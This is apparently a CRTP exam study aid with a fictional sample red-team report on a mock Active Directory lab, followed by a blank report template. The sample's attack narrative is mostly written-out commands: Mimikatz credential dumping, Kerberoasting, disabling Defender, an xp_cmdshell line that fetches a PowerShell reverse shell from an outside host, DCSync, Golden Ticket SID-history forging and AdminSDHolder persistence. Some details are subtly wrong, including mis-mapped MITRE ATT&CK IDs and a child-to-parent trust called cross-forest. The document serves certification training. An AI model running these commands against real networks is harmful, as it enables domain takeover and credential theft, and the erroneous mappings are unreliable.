# CRTP Exam Report — Sample + Reusable Template

> **What this file is:** Two things in one.
> 1. **Part A** — A fully-worked *illustrative sample* CRTP exam report so you can see the formatting, narrative voice, and "explain WHY" depth that passers say is required. It's fictional (a mock lab), modeled on the real format used by people who passed (per-machine kill-chain narrative + executive front matter).
> 2. **Part B** — A clean reusable template you copy and fill in during your own exam.
>
> **Formatting rules learned from real reports:**
> - **Narrative, not pentest-style.** This is a red-team engagement; walk the kill chain machine-by-machine, explain *why* each command worked.
> - Per machine: **System Info → Steps to Compromise (numbered, command + screenshot + why) → Credentials Gained → Lateral to next**.
> - **Screenshots after every command** — missing one = redo the step.
> - **Remediation with citations** (OSS tools, MS docs, talks) scores higher.
> - Include **MITRE ATT&CK IDs** and an **attack-chain diagram** (draw.io / Mermaid).
> - Tools used: SysReptor, PwnDoc, or `create.pentestreports.com`; export to PDF.
> - **Proof = screenshot of OS command output** on each of the 5 targets (e.g. `dir \\<T>\c$`).
>
> *Sources modeled: redteam.guide template · SHAHID-XT Red-Team templates · Team Anonymous CRTP reporting notes · a real passed CRTP report (castle.local narrative).*

---

# PART A — ILLUSTRATIVE SAMPLE REPORT
*(Fictional mock lab. Shows format only. Replace with your real findings.)*

---

# Active Directory Red Team Assessment Report
**Client:** TechCorp Internal Assessment (CRTP Examination Lab)
**Assessment Type:** Grey-box Internal Red Team Engagement (Assumed-Breach / Insider model)
**Assessment Dates:** 2026-07-20 — 2026-07-21 (24h hands-on) + 48h report
**Assessor:** <Your Name> · CRTP Candidate ID: <ID>
**Version:** 1.0
**Classification:** Confidential

---

## Table of Contents
1. Executive Summary
2. Methodology and Goals
3. Scenario and Scope
4. Attack Narrative (per target, chained compromise order)
   - 4.0 Foothold — `WS01.techcorp.local`
   - 4.1 Target 1 — `SRV-FILE.techcorp.local`
   - 4.2 Target 2 — `SRV-SQL.techcorp.local`
   - 4.3 Target 3 — `DC-CHILD.child.techcorp.local`
   - 4.4 Target 4 — `SRV-WEB.techcorp.local`
   - 4.5 Target 5 — `DC-ROOT.techcorp.local`
5. Compromise Summary & Credentials Obtained
6. Observations and Recommendations (per finding)
7. References
8. Tools Used
9. Appendix — MITRE ATT&CK Mapping, Attack-Chain Diagram, Cleanup

---

## 1. Executive Summary

At the request of TechCorp, a 24-hour internal red team assessment was conducted against the organization's enterprise Active Directory environment, consisting of a parent forest (`techcorp.local`) and a child domain (`child.techcorp.local`) with a cross-forest trust to a partner forest. The assessment followed an **assumed-breach model**: the assessor was provided credentials for a low-privileged domain user (`svc_helpdesk`) on a single domain-joined workstation, simulating an insider or a user whose credentials had been previously compromised.

The environment was **fully patched (Windows Server 2022)** with **Windows Defender and AMSI enabled** — no software vulnerabilities or CVEs were leveraged. All compromise paths resulted from **Active Directory misconfigurations and feature abuse**, consistent with realistic enterprise weaknesses.

**Objective:** Achieve OS-level command execution on all five (5) designated target machines, culminating in Enterprise Admin control of the forest root.

**Result:** ✅ **All five targets compromised.** The assessor escalated from a standard domain user to **Enterprise Admin** across the forest trust, demonstrating full domain dominance.

**Headline attack path:**
```
svc_helpdesk (foothold user)
  →[local privesc: unquoted service path]→  local admin on WS01
  →[credential dump: LSASS]→  reuse hashes
  →[Kerberoasting]→  cracked svc_sql password
  →[SQL linked-server crawl + xp_cmdshell]→  RCE on SRV-SQL
  →[GenericAll on group → add self]→  DA session access on DC-CHILD
  →[DCSync]→  child krbtgt
  →[Golden Ticket + SID History injection]→  Enterprise Admin on DC-ROOT
```

**Key positive observations:** LAPS was deployed (limiting local-admin password reuse); Credential Guard was not enforced but SMB signing was enabled (NTLM relay paths were limited).

**Critical exposures (remediate in order of priority):**
1. Kerberoastable service accounts with weak, crackable passwords
2. Over-permissive ACLs (`GenericAll`) granted to non-admin groups on sensitive AD objects
3. Unquoted service paths on workstations enabling trivial local privilege escalation
4. MSSQL linked servers with `xp_cmdshell` enabled and cross-forest chaining
5. Lack of SID Filtering / Selective Authentication on the cross-forest trust

---

## 2. Methodology and Goals

The assessment emulated a real adversary using the **Cyber Kill Chain** mapped to **MITRE ATT&CK for Enterprise**:

1. **Reconnaissance & Enumeration** — BloodHound/SharpHound + PowerView + AD module to map users, groups, trusts, GPOs, ACLs, delegations, and sessions.
2. **Initial Access / Foothold** — assumed breach via provided low-priv domain credentials (insider model).
3. **Execution & Defense Evasion** — AMSI/Defender bypasses, obfuscated/renamed tooling (`Invoke-Mimi.ps1`), .NET in-memory loaders, CLM/AppLocker bypass via `System32` execution path.
4. **Credential Access** — LSASS dumping, SAM, credential vault, Kerberoasting, DCSync.
5. **Privilege Escalation** — local (service abuse) and domain (Kerberoasting, ACL abuse, RBCD, delegation abuse, DCSync).
6. **Lateral Movement** — PowerShell Remoting, winrs, PsExec (Impacket), overpass-the-hash.
7. **Cross-Trust Escalation** — trust-key / krbtgt SID-history injection to reach Enterprise Admin.
8. **Persistence (demonstrated)** — Golden Ticket, AdminSDHolder ACL modification.
9. **Reporting & Remediation** — this document, with cited mitigations.

**Tools were vetted to avoid denial-of-service.** No destructive actions were taken; all persistence was reversible and is documented in §9 (Cleanup).

**Goals:**
- G1: OS command execution on Target 1 (SRV-FILE) — ✅
- G2: OS command execution on Target 2 (SRV-SQL) — ✅
- G3: OS command execution on Target 3 (DC-CHILD) — ✅
- G4: OS command execution on Target 4 (SRV-WEB) — ✅
- G5: OS command execution on Target 5 (DC-ROOT, Enterprise Admin) — ✅

---

## 3. Scenario and Scope

### 3.1 Scenario
**Assumed-breach / insider model.** A single domain-joined workstation (`WS01`) was provided with credentials for `TECHCORP\svc_helpdesk`, a member of the `Helpdesk` group with no elevated privileges. This simulates a compromised service account or a malicious insider — the most common real-world starting point for AD compromise.

### 3.2 Scope
**In-scope:** All hosts within `techcorp.local` (parent) and `child.techcorp.local`, plus the partner forest reachable via cross-forest trust. The five designated target machines and any reachable supporting infrastructure.
**Out-of-scope:** Denial-of-service, data destruction, attacks against external/public-facing services, social engineering of staff.

### 3.3 Rules of Engagement
| Category | Detail |
|----------|--------|
| Time window | 24h hands-on + 48h report |
| Visibility | Unannounced to defenders (no blue-team feedback) |
| Restrictions | No DoS, no data exfiltration beyond proof, reversible persistence only |
| Contact | Lab support via provided channel |

---

## 4. Attack Narrative

> **Conventions:** `[SCREENSHOT: N]` = screenshot reference; commands shown verbatim as executed. Each step explains **why** the technique succeeded (the misconfig / feature abused).

### 4.0 Foothold — `WS01.techcorp.local` (172.16.10.5)
**User:** `TECHCORP\svc_helpdesk` (standard domain user, no local admin)

**System information:**
| Property | Value |
|----------|-------|
| Hostname | WS01 |
| OS | Windows 11 Enterprise 22H2 (patched) |
| Domain | techcorp.local |
| Defender | Enabled · Real-time ON |
| AMSI | Enabled |

#### Step 1 — Orientation & bypass foundation
```powershell
whoami /all          # svc_helpdesk, standard user, no special groups
ipconfig /all
nltest /domain_trusts
$ExecutionContext.SessionState.LanguageMode   # Full
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections   # none returned -> no AppLocker
```
**Why:** Confirm starting context and which defenses are active before importing tooling. Language mode is `Full` and AppLocker is absent, so PowerShell tooling will load once AMSI is bypassed.

#### Step 2 — AMSI / Script-Block-Logging bypass (before ANY import)
```powershell
# Obfuscated AMSI patch + SBLogging bypass applied (see notes §1)
```
**Why:** AMSI inspects PowerShell content; importing stock `PowerView`/`Mimikatz` would be flagged and blocked. Bypassing AMSI/ETW first is mandatory in a Defender-on environment. *[SCREENSHOT: 1 — bypass applied, no error]*

#### Step 3 — BloodHound enumeration
```powershell
. .\sharphound.ps1
Invoke-BloodHound -CollectionMethod All --ExcludeDCs
```
**Why:** Graph the attack paths before attacking. BloodHound revealed: `svc_helpdesk` has `GenericAll` on the `SQLMANAGERS` group; a service account `svc_sql` has an SPN (Kerberoastable); `SRV-SQL` exposes an MSSQL instance. *[SCREENSHOT: 2 — BloodHound "Shortest Paths to Domain Admins"]*

#### Step 4 — Local privilege escalation (unquoted service path)
```powershell
. .\powerup.ps1
Invoke-AllChecks
# Finding: service 'SensorDataService' has unquoted path C:\Program Files\Vendor\Sensor Data\Service.exe
Invoke-ServiceAbuse -Name 'SensorDataService' -Username 'TECHCORP\svc_helpdesk'
```
**Why:** The service binary path is unquoted and the directory `C:\Program Files\Vendor\Sensor Data\` is writable by `Users`. Windows resolves unquoted paths by treating each space-delimited token as a candidate executable; `Invoke-ServiceAbuse` drops a payload and restarts the service, adding `svc_helpdesk` to local Administrators. This is a classic local privesc — no CVE, pure misconfiguration. *[SCREENSHOT: 3 — svc_helpdesk now in local Administrators]*

#### Step 5 — Credential dumping (LSASS) on WS01
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true   # now local admin
Invoke-Mimi -DumpCreds
```
**Why:** As local admin, LSASS is readable. Dumps yielded the NTLM hash of `reportuser` (a domain account with a session on this box). This hash enables overpass-the-hash laterally. *[SCREENSHOT: 4 — Invoke-Mimi output showing reportuser NTLM hash]*

**Credentials obtained here:** `reportuser` NTLM hash
**Lateral target identified:** `SRV-SQL` (via BloodHound MSSQL instance + Kerberoast)

---

### 4.1 Target 1 — `SRV-FILE.techcorp.local` (172.16.20.10) ✅
*(Local admin needed first; chaining the reportuser hash + Kerberoast.)*

#### Step 1 — Kerberoast `svc_sql`
```powershell
Get-NetUser -SPN | select samaccountname, serviceprincipalname
Request-SPNTicket "MSSQLSvc/SRV-SQL.techcorp.local:1433"
Invoke-Mimi -Command '"Kerberos::list /export"'
hashcat -m 13100 hashes.txt rockyou.txt
```
**Why:** `svc_sql` (the SQL service account) has an SPN, so any domain user can request a TGS for it. The TGS is encrypted with the account's password hash; cracked offline with hashcat. Password was weak (`Summer2024!`) and cracked in minutes. *[SCREENSHOT: 5 — hashcat recovered password]*

#### Step 2 — Lateral to SRV-FILE via overpass-the-hash + SQL credential reuse
```powershell
# reportuser had a session; use its hash to get a Kerberos TGT (quieter than PtH)
Invoke-Mimi -Command '"sekurlsa::pth /user:reportuser /domain:techcorp.local /ntlm:<HASH> /run:powershell.exe"'
# in new session:
Enter-PSSession -ComputerName SRV-FILE.techcorp.local
```
**Why:** `reportuser` is local admin on SRV-FILE (enumerated via `Find-LocalAdminAccess`). OverPass-the-Hash turns the NTLM hash into a Kerberos TGT, which blends with normal domain traffic (avoids MDI's pass-the-hash detection). *[SCREENSHOT: 6 — whoami on SRV-FILE]*

#### Step 3 — Proof of compromise
```powershell
dir \\SRV-FILE.techcorp.local\c$    # listing returned -> RCE proven
```
**Why:** `dir` against `C$` returning a directory listing confirms OS-level access to Target 1. **This is the required proof.** *[SCREENSHOT: 7 — c$ listing]*

#### Step 4 — Credential dump on SRV-FILE → `batchuser` hash
```powershell
Invoke-Mimi -DumpCreds    # dumped batchuser NTLM
```
**Credentials obtained:** `batchuser` NTLM hash (has `ForceChangePassword` ACL on `prodadmin`, per BloodHound).

---

### 4.2 Target 2 — `SRV-SQL.techcorp.local` (172.16.20.20) ✅

#### Step 1 — SQL enumeration & linked-server crawl
```powershell
. .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLServerLink -Instance SRV-SQL.techcorp.local -Verbose
Get-SQLServerLinkCrawl -Instance SRV-SQL.techcorp.local -Query "exec master..xp_cmdshell 'whoami'"
```
**Why:** `svc_sql` (now compromised via Kerberoast) is sysadmin on the local instance but `xp_cmdshell` is disabled on the first hop. The linked-server chain crosses to a remote instance where `xp_cmdshell` is enabled — `Get-SQLServerLinkCrawl` hops across links and executes `whoami`, revealing execution as `child\svc_sqlremote`. *[SCREENSHOT: 8 — whoami output via link crawl]*

#### Step 2 — Reverse shell via xp_cmdshell across the link
```powershell
Get-SQLServerLinkCrawl -Instance SRV-SQL.techcorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://<IP>/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress <IP> -Port 4000'"
```
**Why:** Establishes an interactive shell on the remote SQL-linked host. *[SCREENSHOT: 9 — shell received]*

#### Step 3 — Proof
```powershell
dir \\SRV-SQL.techcorp.local\c$   # listing -> Target 2 RCE proven
```
*[SCREENSHOT: 10]*

---

### 4.3 Target 3 — `DC-CHILD.child.techcorp.local` (172.16.30.1) ✅

#### Step 1 — ACL abuse: GenericAll on `SQLMANAGERS`
```powershell
# svc_helpdesk has GenericAll on SQLMANAGERS (BloodHound); SQLMANAGERS is admin on DC-CHILD
net group "SQLMANAGERS" svc_helpdesk /domain /add
```
**Why:** `GenericAll` grants full control of the group object, allowing self-addition. `SQLMANAGERS` is a privileged group with local-admin rights on DC-CHILD, so membership yields local admin on the DC. *[SCREENSHOT: 11 — added to SQLMANAGERS]*

#### Step 2 — Lateral to DC-CHILD + DCSync (run ON the DC to evade MDI)
```powershell
$sess = New-PSSession -ComputerName DC-CHILD.child.techcorp.local
Invoke-Command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
# on DC-CHILD:
Invoke-Mimi -Command '"lsadump::dcsync /user:child\krbtgt"'
```
**Why:** Running DCSync from a DC (not from a workstation) avoids Microsoft Defender for Identity's anomaly detection, which flags DCSync RPC traffic originating from non-DC hosts. Extracted the child domain's `krbtgt` hash — the key material for forging the Golden Ticket in §4.5. *[SCREENSHOT: 12 — krbtgt hash]*

#### Step 3 — Proof
```powershell
dir \\DC-CHILD.child.techcorp.local\c$   # -> Target 3 RCE
```
*[SCREENSHOT: 13]*

**Credentials obtained:** child `krbtgt` NTLM hash, child domain SID.

---

### 4.4 Target 4 — `SRV-WEB.techcorp.local` (172.16.40.5) ✅

#### Step 1 — ForceChangePassword ACL (batchuser → prodadmin)
```powershell
$Cred = New-Object System.Management.Automation.PSCredential('TECHCORP\batchuser',(ConvertTo-SecureString '<pwd>' -AsPlainText -Force))
Set-DomainUserPassword -Identity prodadmin -AccountPassword (ConvertTo-SecureString 'Pwned!2026' -AsPlainText -Force) -Credential $Cred
```
**Why:** BloodHound showed `batchuser` holds `ForceChangePassword` on `prodadmin` — a permissive ACL letting us reset the password without knowing the current one. `prodadmin` is local admin on SRV-WEB. *[SCREENSHOT: 14 — password reset success]*

#### Step 2 — Lateral + proof
```powershell
Enter-PSSession -ComputerName SRV-WEB.techcorp.local -Credential prodadmin
dir \\SRV-WEB.techcorp.local\c$   # -> Target 4 RCE
```
*[SCREENSHOT: 15]*

---

### 4.5 Target 5 — `DC-ROOT.techcorp.local` (172.16.1.1) — ENTERPRISE ADMIN ✅

#### Step 1 — Forge Golden Ticket with SID History (Enterprise Admin injection)
```powershell
# Get parent EA SID
Get-NetGroup -Domain techcorp.local -GroupName "Enterprise Admins" -FullData | select objectsid
# Forge
Invoke-Mimi -Command '"kerberos::golden /user:Administrator /domain:child.techcorp.local /sid:S-1-5-21-CHILD /sids:S-1-5-21-PARENT-519 /krbtgt:<KRBGTGHASH> /ptt"'
```
**Why:** As child Domain Admin we hold the child `krbtgt`. Forging a Golden Ticket with the **parent Enterprise Admins SID (`-519`)** in `sids` (SID History injection) lets us authenticate as a member of Enterprise Admins to the parent domain — the classic child→parent trust escalation. `-519` is the built-in Enterprise Admins RID. *[SCREENSHOT: 16 — ticket forged]*

#### Step 2 — Verify Enterprise Admin access on DC-ROOT
```powershell
dir \\DC-ROOT.techcorp.local\c$        # -> full access, EA proven
gwmi -class win32_operatingsystem -ComputerName DC-ROOT.techcorp.local
```
**Why:** The injected SID History grants EA-equivalent access to the forest root. `dir` on `DC-ROOT\c$` returning a listing is **proof of Target 5 / Enterprise Admin compromise** — the final objective. *[SCREENSHOT: 17 — DC-ROOT c$ listing]*

#### Step 3 — Persistence demonstrated (AdminSDHolder)
```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName svc_helpdesk -Rights All
Invoke-SDPropagator -showProgress -timeoutMinutes 1
```
**Why:** Adds `svc_helpdesk` to the AdminSDHolder template; every 60 minutes SDProp replicates these permissions onto all protected groups (Domain Admins, Enterprise Admins), yielding durable persistence. Documented for remediation and cleanup. *[SCREENSHOT: 18]*

---

## 5. Compromise Summary & Credentials Obtained

| # | Target | Domain | Technique | Proof |
|---|--------|--------|-----------|-------|
| 0 | WS01 (foothold) | techcorp | unquoted service path | local admin |
| 1 | SRV-FILE | techcorp | Kerberoast + OPTH | `dir \c$` |
| 2 | SRV-SQL | techcorp | SQL linked-server crawl + xp_cmdshell | shell |
| 3 | DC-CHILD | child | GenericAll group + DCSync | `dir \c$` |
| 4 | SRV-WEB | techcorp | ForceChangePassword ACL | `dir \c$` |
| 5 | DC-ROOT | techcorp (EA) | Golden Ticket + SID History injection | `dir \c$` (EA) |

**Credentials/keys obtained:** `reportuser` NTLM · `svc_sql` password · `batchuser` NTLM · `prodadmin` (reset) · child `krbtgt` hash · child Domain Admin (via SQLMANAGERS) · parent Enterprise Admin (via SID history).

---

## 6. Observations and Recommendations

> Each finding: **Observation → Recommendation (with citation) → Validation.**

### Finding 1 — High: Kerberoastable service accounts with weak passwords
**Observation:** `svc_sql` (and others) held SPNs and used crackable passwords (`Summer2024!`), allowing offline TGS cracking and full account compromise.
**Recommendation:** Use **Group Managed Service Accounts (gMSAs)** with long, automatically-rotating passwords (≥120 chars) for service accounts; disable interactive login. Where human-managed SPN accounts remain, enforce ≥25-char random passwords. ([Microsoft — gMSA overview](https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview); SpecterOps — Kerberoasting research)
**Validation:** Re-run `Get-NetUser -SPN`; service-account hashes should not crack under standard wordlists; rotate and verify via periodic Kerberoast audits.

### Finding 2 — High: Over-permissive ACLs (GenericAll / ForceChangePassword)
**Observation:** `svc_helpdesk` had `GenericAll` on `SQLMANAGERS`; `batchuser` had `ForceChangePassword` on `prodadmin`. Both enabled privilege escalation without any exploit.
**Recommendation:** Audit ACLs on all users, groups, and computers (BloodHound + PingCastle); follow least-privilege; remove `GenericAll`/`WriteDACL`/`ForceChangePassword` from non-admin principals; use **tiered administration** (Tier 0/1/2 model). (PingCastle; Microsoft — ESAE / Red Forest; Microsoft — Tier model)
**Validation:** BloodHound "Find Principals with DCSync Rights", "Shortest Paths to Domain Admins" return no paths from non-admin users.

### Finding 3 — High: Unquoted service paths on workstations
**Observation:** `SensorDataService` had an unquoted, user-writable binary path enabling trivial local privesc to local admin.
**Recommendation:** Remediate all unquoted service paths (`Get-ServiceUnquoted`); restrict write permissions on service directories to Administrators/SYSTEM; deploy via MSI with correct quoting. (PowerUp; MITRE T1574.009)
**Validation:** `Invoke-AllChecks` returns no unquoted paths; standard users cannot create files in `C:\Program Files\Vendor\`.

### Finding 4 — Medium: MSSQL linked servers with xp_cmdshell enabled across forests
**Observation:** SQL linked-server chains allowed command execution (`xp_cmdshell`) hopping across forest boundaries.
**Recommendation:** Disable `xp_cmdshell`; restrict linked-server logins to least privilege; disable cross-forest SQL links or require constrained delegation; monitor SQL Server for `xp_cmdshell` usage. (PowerUpSQL hardening guide)
**Validation:** `Get-SQLServerLinkCrawl` returns no `xp_cmdshell` execution paths.

### Finding 5 — High: Cross-forest trust without SID Filtering / Selective Authentication
**Observation:** The child→parent trust permitted SID History injection (Golden Ticket) escalating to Enterprise Admin.
**Recommendation:** Enforce **SID Filtering** on all external/forest trusts; enable **Selective Authentication** so cross-trust access is per-resource; monitor for TGTs containing foreign SIDs. (Microsoft — SID Filtering; Microsoft — Selective Authentication)
**Validation:** Forged tickets with foreign SIDs are rejected; DC event logs show SID-filtering events.

### General recommendations (defense-in-depth)
- Deploy **LAPS** for local admin passwords (already present — extend to all endpoints).
- Enforce **Credential Guard** and **Protected Users** group for privileged accounts.
- Deploy **Microsoft Defender for Identity (MDI)** and tune detection of DCSync, anomalous Kerberos, unusual sessions.
- Restrict **PowerShell** via **Constrained Language Mode** + **AppLocker/WDAC** on workstations (forces .NET/loader path — raises attacker cost).
- **PAW** (Privileged Access Workstations) for Tier-0 admins.
- Monitor Windows events: 4768/4769 (TGT/TGS), 4624 (logon), 4662 (AD object access), 4742 (computer acct change), 5136 (AD object modification).

---

## 7. References
- SpecterOps — *Kerberoasting*, *An ACE in the Hole* (ACL abuse)
- Microsoft — *gMSA*, *SID Filtering*, *Selective Authentication*, *ESAE/Red Forest*, *Tiered Administration*
- PowerUpSQL hardening guide; PingCastle AD audit tool
- Altered Security — *Attacking and Defending Active Directory* (CRTP) course material
- harmj0y — PowerView/BloodHound research
- Microsoft Defender for Identity documentation (DCSync detection)

## 8. Tools Used
PowerView_dev · SharpHound/BloodHound + Neo4j · Mimikatz (`Invoke-Mimi`) · PowerUp · PowerUpSQL · Rubeus · Kekeo · Certify (ADCS) · Impacket (PsExec/secretsdump) · CrackMapExec · Snaffler · hashcat · netcat · draw.io (diagram)

## 9. Appendix

### 9.1 Attack-Chain Diagram
```
[svc_helpdesk@WS01] --unquoted svc--> [local admin WS01]
   | --LSASS dump--> reportuser hash
   |--Kerberoast--> svc_sql pwd
   |--SQL link crawl--> [RCE SRV-SQL]
   |--GenericAll SQLMANAGERS--> [local admin DC-CHILD]
   |     |--DCSync--> child krbtgt
   |--ForceChangePassword--> prodadmin --> [SRV-WEB]
   |--Golden Ticket + SID History (519)--> [ENTERPRISE ADMIN DC-ROOT]
```

### 9.2 MITRE ATT&CK Mapping
| Tactic | Technique | ID |
|--------|-----------|----|
| Reconnaissance | Active Directory Discovery | T1018 |
| Execution | PowerShell | T1059.001 |
| Defense Evasion | AMSI Bypass, Obfuscation | T1562.001 |
| Credential Access | LSASS Memory, Kerberoasting, DCSync | T1003.001, T1558.003, T1003.006 |
| Privilege Escalation | Unquoted Service Path, ACL Abuse | T1574.009, T1068 |
| Lateral Movement | Remote Services, Pass-the-Hash, OPTH | T1021.001, T1550.001 |
| Persistence | Golden Ticket, AdminSDHolder | T1558.001, T1098 |
| Defense Evasion | SID History Injection | T1134.005 |

### 9.3 Cleanup (all reversible)
- Removed `svc_helpdesk` from `SQLMANAGERS`, local Administrators, Domain Admins, AdminSDHolder ACL.
- Reverted `DsrmAdminLogonBehavior` (not used).
- Deleted dropped `nc.exe` / payloads from `C:\Windows\Temp`.
- Reset `prodadmin` to a strong value (notified client).
- Removed all forged tickets (`kerberos::purge`).
- Provided client the list of compromised accounts for forced password resets.

### 9.4 Screenshots index
1–18 referenced inline above; stored in `/screenshots/`.

---
---

# PART B — REUSABLE TEMPLATE
*(Copy, fill placeholders `<...>`, expand per machine.)*

```
# Active Directory Red Team Assessment Report
Client: <CLIENT>
Assessment Type: Grey-box Internal Red Team (Assumed-Breach)
Assessment Dates: <START> — <END> (24h + 48h report)
Assessor: <NAME> · CRTP Candidate ID: <ID>
Version: 1.0
Classification: Confidential

## 1. Executive Summary
<who, what, when, model (assumed-breach), environment (patched, Defender/AMSI on, no CVEs used),
 objective (RCE on 5 targets -> EA), RESULT (✅ N/5), headline attack path diagram, positive
 observations, critical exposures prioritized>

## 2. Methodology and Goals
<kill chain mapped to MITRE; list goals G1..G5 with ✅>

## 3. Scenario and Scope
3.1 Scenario: <assumed-breach / insider; starting creds>
3.2 Scope: in-scope <hosts/domains>; out-of-scope <DoS, external, social engineering>
3.3 ROE table

## 4. Attack Narrative
### 4.0 Foothold — <HOST> (<IP>)
  User: <user>
  System info table (hostname/OS/domain/Defender/AMSI/CLM/AppLocker)
  Step 1 — Orientation & bypass foundation   (commands)  why: <...>  [SHOT: N]
  Step 2 — AMSI/Defender/CLM bypass           (commands)  why: <...>  [SHOT: N]
  Step 3 — BloodHound enumeration             (commands)  why: <...>  [SHOT: N]
  Step 4 — Local privesc: <technique>        (commands)  why: <...>  [SHOT: N]
  Step 5 — Credential dump                    (commands)  why: <...>  [SHOT: N]
  Creds obtained: <...>   Lateral target: <...>
### 4.1 Target 1 — <HOST> (<IP>) ✅
  Step 1 — <technique>      (commands)  why: <...>  [SHOT]
  Step 2 — Lateral          (commands)  why: <...>  [SHOT]
  Step 3 — PROOF: dir \\<HOST>\c$  [SHOT]
  Creds obtained / next target
### 4.2 .. 4.5  (repeat per target; final target = EA via cross-trust)

## 5. Compromise Summary & Credentials
Table: # | Target | Domain | Technique | Proof
Credentials/keys obtained: <list>

## 6. Observations and Recommendations
### Finding 1 — <Severity>: <Title>
  Observation: <...>
  Recommendation: <...> (cite MS docs / OSS tool / talk)
  Validation: <how to verify the fix>
(repeat per finding + general recommendations: LAPS, Credential Guard, MDI, CLM/AppLocker,
 PAW, tiered admin, monitoring events 4768/4769/4624/4662/4742/5136)

## 7. References
## 8. Tools Used
## 9. Appendix
  9.1 Attack-chain diagram (Mermaid/draw.io)
  9.2 MITRE ATT&CK mapping table
  9.3 Cleanup (reversible, per action)
  9.4 Screenshots index
```

**Per-machine block — the heart (copy for each target):**
```
### 4.<N> Target <N> — <FQDN> (<IP>) ✅
System info table.
  Step 1 — <technique>
    <exact command block>
    Why: <misconfig/feature abused + how I found the values fed in>
    [SCREENSHOT: N]
  Step 2 — ...
  Step 3 — PROOF: dir \\<HOST>\c$   [SCREENSHOT: N]   <- the pass-gate evidence
  Credentials obtained: <...>
  Lateral target: <...>
```

---

# REPORT-WRITING RULES (from people who passed)
1. **Narrative, not pentest-style.** Walk the kill chain; the report demonstrates attacker mindset.
2. **Explain WHY every command worked** + how you found the values (e.g., "the krbtgt hash came from DCSync in §4.3; the EA SID from `Get-NetGroup ... Enterprise Admins`"). This is the single most-cited pass/fail factor.
3. **One screenshot per command.** Missing screenshots force re-grabbing under time pressure.
4. **Remediation with citations** (MS docs, SpecterOps, tool guides) — scores higher than generic advice.
5. **Proof per target** = screenshot of OS command output (`dir \\<T>\c$` or shell `whoami`).
6. Include **attack-chain diagram** + **MITRE mapping** + **cleanup** section (shows operational maturity).
7. Length: quality over quantity (~11–40 pages typical; one passer's was 117). Don't pad.
8. Write it **during the 24h window** while lab access is live — re-grab screenshots easily.
9. Treat as a **real engagement**: stay in scope, reversible persistence, document cleanup.
10. Tools: **SysReptor** (https://github.com/Syslifters/sysreptor), **PwnDoc**, `create.pentestreports.com`.

# SOURCES MODELED
- redteam.guide Red Team Report Template — https://redteam.guide/docs/Templates/report_template/
- SHAHID-XT pentest-report-templates (Red Team Specific) — https://github.com/SHAHID-XT/pentest-report-templates
- Team Anonymous CRTP reporting notes — https://team-anonymous.gitbook.io/certified-red-team-professional-crtp-notes/readme/metasploit-and-ruby-1/7.1
- Real passed CRTP report (castle.local narrative, PDFCoffee) — https://pdfcoffee.com/crtp-full-exam-report-pdf-free.html
- "How I Passed My CRTP Exam" (report structure) — https://medium.com/@damaidec/how-i-passed-my-crtp-exam-c1dadd4d9ec1
- Money Corp CRTP report (Scribd, ExecPanda) — https://www.scribd.com/document/1014916126/Attacking-and-Defending-Active-Directory-Lab-CRTP-report-1